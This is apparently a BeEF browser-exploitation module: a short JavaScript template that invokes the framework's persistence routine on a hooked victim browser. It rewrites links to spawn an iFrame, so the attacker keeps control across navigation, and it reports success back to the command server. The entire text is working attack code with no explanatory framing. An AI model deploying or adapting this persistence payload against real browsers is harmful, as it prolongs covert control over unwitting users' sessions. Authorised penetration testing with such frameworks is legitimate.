beef.execute(function() {
	beef.session.persistant();
	beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result=Links have been rewritten to spawn an iFrame.');
});
